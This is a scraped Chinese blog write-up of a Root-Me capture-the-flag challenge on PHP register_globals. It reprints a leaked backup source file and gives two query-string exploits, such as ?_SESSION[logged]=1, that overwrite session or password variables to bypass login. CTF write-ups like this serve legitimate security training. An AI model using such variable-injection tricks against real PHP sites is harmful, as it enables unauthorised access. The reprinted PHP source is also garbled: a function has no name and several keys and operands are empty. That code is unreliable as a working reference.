<!--yml
category: 未分类
date: 2022-04-26 14:49:08
-->

# CTF-rootme 题解之PHP register globals_weixin_30881367的博客-CSDN博客

> 来源：[https://blog.csdn.net/weixin_30881367/article/details/99600339](https://blog.csdn.net/weixin_30881367/article/details/99600339)

LINK:[https://www.root-me.org/en/Challenges/Web-Server/PHP-register-globals](https://www.root-me.org/en/Challenges/Web-Server/PHP-register-globals)

　　  [http://challenge01.root-me.org/web-serveur/ch17](http://challenge01.root-me.org/web-serveur/ch17)

Rererrence:[http://php.net/manual/zh/security.globals.php](http://php.net/manual/zh/security.globals.php)

从 <acronym title="PHP: Hypertext Preprocessor">PHP</acronym> [» 4.2.0](http://www.php.net/releases/4_2_0.php) 版开始配置文件中 <acronym title="PHP: Hypertext Preprocessor">PHP</acronym> 指令 [register_globals](http://php.net/manual/zh/ini.core.php#ini.register-globals) 的默认值从 on 改为 off 了,当 register_globals 打开以后，各种变量都被注入代码，例如来自 <acronym title="Hyper Text Markup Language">HTML</acronym> 表单的请求变量。再加上 <acronym title="PHP: Hypertext Preprocessor">PHP</acronym> 在使用变量之前是无需进行初始化的,也可能会从其它途径进来，比如说通过 <acronym title="Uniform Resource Locator">URL</acronym> 的 GET。

#### Statement

It seems that the developper often leaves backup files around...

根据本题提示，存在备份文件的可能，尝试访问http://challenge01.root-me.org/web-serveur/ch17/index.php.bak这个文件，提示可以下载，下载之后打开得到文件内容如下：

其中判断登录是否成功的语句为

```
if (( isset ($password) && $password!="" && auth($password,$hidden_password)==1) || (is_array($_SESSION) && ) ){ $aff=display("well done, you can validate with the password : $hidden_password");
```

```
其中一个条件是：如果用户输入的password等于hidden_password这个变量，就会提示密码可以通过验证。
另外一个条件是：$**_SESSION["logged"]==1**可以通过验证,即_****SESSION[logged]=1

访问网址：http://challenge01.root-me.org/web-serveur/ch17/index.php?_SESSION[logged]=1
******第二种方法：http://******challenge01.root-me.org/web-serveur/ch17/?password=1&hidden_password=1，直接在同一页面访问************http://******challenge01.root-me.org/web-serveur/ch17同样可以得到flag。********** 
```

```
<?php function ($password, $hidden_password){ $res=0; if (isset($password) && $password!=""){ if ( $password == $hidden_password ){ $res=1;
        }
    } $_SESSION["logged"]=$res; return $res;
} function display($res){ $aff= ' <html>
      <head>
      </head>
      <body>
        <h1>Authentication v 0.05</h1>
        <form action="" method="POST">
          Password&nbsp;<br/>
          <input type="password" name="password" /><br/><br/>
          <br/><br/>
          <input type="submit" value="connect" /><br/><br/>
        </form>
        <h3>'.htmlentities($res).'</h3>
      </body>
      </html>'; return $aff;
} session_start(); if ( ! isset($_SESSION["logged"]) ) $_SESSION["logged"]=0; $aff=""; include("config.inc.php"); if (isset($_POST["password"])) $password = $_POST[""]; if (!ini_get('')) { $superglobals = array($_SERVER, $_ENV,$_FILES, $_COOKIE, $_POST, $_GET); if (isset($_SESSION)) { array_unshift($superglobals, $_SESSION);
    } foreach ($superglobals as $superglobal) { extract($superglobal, 0 );
    }
} if (( isset ($password) && $password!="" && auth($password,$hidden_password)==1) || (is_array($_SESSION) && $_SESSION["logged"]==1 ) ){ $aff=display("well done, you can validate with the password : $hidden_password");
} else { $aff=display("try again");
} echo $aff; ?>
```